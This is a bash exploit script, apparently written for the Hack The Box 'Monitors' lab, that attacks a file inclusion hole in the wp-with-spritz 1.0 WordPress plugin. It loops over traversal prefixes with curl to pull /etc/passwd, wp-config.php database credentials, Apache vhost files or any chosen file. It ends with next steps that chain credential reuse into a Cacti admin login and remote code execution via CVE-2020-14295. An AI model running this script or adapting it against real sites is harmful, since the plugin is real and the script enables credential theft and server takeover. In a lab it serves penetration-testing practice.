#!/usr/bin/env bash
# HTB Monitors — wp-with-spritz 1.0 `url` parameter LFI
# Source: monitors.txt   |   Arsenal ref: §5.1
#
# Gardener: the plugin does file_get_contents($_GET['url']) with no validation, so
# traversal prefixes vary by cwd. Collects the credentials chain: wp-config.php for
# MySQL, then Apache vhosts to find cacti-admin.monitors.htb.
#
# Usage:
#   ./poc_htb_monitors_lfi.sh http://monitors.htb
#   ./poc_htb_monitors_lfi.sh http://monitors.htb --targets wp-config
#   ./poc_htb_monitors_lfi.sh http://monitors.htb --raw /proc/self/environ

set -u
BASE="${1:-http://monitors.htb}"
shift || true
PLUGIN="/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php"
MODE="all"
RAW=""

while [ $# -gt 0 ]; do
  case "$1" in
    --targets) MODE="$2"; shift 2 ;;
    --raw)     RAW="$2";   shift 2 ;;
    *) echo "unknown arg: $1" >&2; exit 2 ;;
  esac
done

fetch() {
  local label="$1" url="$2"
  echo "===== $label ====="
  echo "[*] $url"
  curl -s --max-time 15 "$url" | head -c 4000
  echo
  echo
}

# Traversal variants: the prefix depth needed depends on the include path used by
# file_get_contents relative to the plugin directory.
traverse() {
  local path="$1" prefix
  for prefix in "/../../../../" "/../../../" "/../../" "/../" "//" "/" ""; do
    echo "http://x${prefix}${path#/}"
  done
}

if [ -n "$RAW" ]; then
  while read -r variant; do
    url="$BASE$PLUGIN?url=${variant#http://x}"
    fetch "raw: $RAW" "$url"
  done < <(traverse "$RAW")
  exit 0
fi

if [ "$MODE" = "wp-config" ]; then
  TARGETS="/wp-config.php"
else
  TARGETS="/etc/passwd /wp-config.php /etc/apache2/sites-enabled/000-default.conf"
fi

for path in $TARGETS; do
  while read -r variant; do
    url="$BASE$PLUGIN?url=${variant#http://x}"
    body=$(curl -s --max-time 15 "$url")
    if [ -n "$body" ] && [ "${#body}" -gt 32 ]; then
      fetch "$path" "$url"
      break
    fi
  done < <(traverse "$path")
done

cat <<'EOF'
=== Next steps ===
1. From wp-config.php: DB_USER / DB_PASSWORD -> mysql -u <user> -p
   Reused MySQL password is the Cacti admin password (arsenal §3.3).
2. From the vhost config: cacti-admin.monitors.htb -> add to /etc/hosts.
3. Cacti 1.2.12 then goes to CVE-2020-14295 (§3.3) for RCE as www-data.
EOF
